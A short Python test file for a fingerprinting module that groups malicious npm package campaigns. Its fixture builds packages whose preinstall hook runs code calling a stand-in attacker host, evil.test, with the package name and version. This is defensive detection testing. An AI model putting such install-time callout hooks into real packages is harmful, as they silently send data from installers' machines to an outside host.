from argo.dataset.fingerprint import fingerprint
from tests.helpers import make_pkg, pkg_json


def _clone(name: str, version: str):
    return make_pkg(
        {
            "package.json": pkg_json(name, version, scripts={"preinstall": "node index.js"}),
            "index.js": f"require('https').get('http://evil.test/?p={name}&v={version}')",
            "README.md": f"# {name}",
        }
    )


def test_campaign_clones_share_fingerprint():
    assert fingerprint(_clone("aaa-api", "9.9.9"), "aaa-api", "9.9.9") == fingerprint(
        _clone("bbb-auth", "1.0.0"), "bbb-auth", "1.0.0"
    )


def test_different_code_differs():
    other = make_pkg({"package.json": pkg_json("x"), "index.js": "console.log(1)"})
    assert fingerprint(other, "x", "1.0.0") != fingerprint(_clone("x", "1.0.0"), "x", "1.0.0")
